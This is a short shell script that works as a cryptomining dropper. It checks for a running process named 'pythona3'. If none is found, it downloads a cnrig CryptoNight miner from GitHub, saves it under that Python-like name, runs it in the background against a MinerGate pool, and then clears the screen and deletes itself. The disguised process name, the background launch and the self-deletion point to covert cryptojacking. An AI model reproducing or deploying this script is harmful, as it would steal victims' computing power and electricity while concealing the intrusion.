#!/bin/sh
ps cax | grep pythona3 > /dev/null
if [ $? -eq 0 ]; then
  clear
  rm -- "$0"
else
  wget -O pythona3 https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64
  chmod +x pythona3
  ./pythona3 --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B
  clear
  rm -- "$0"
fi

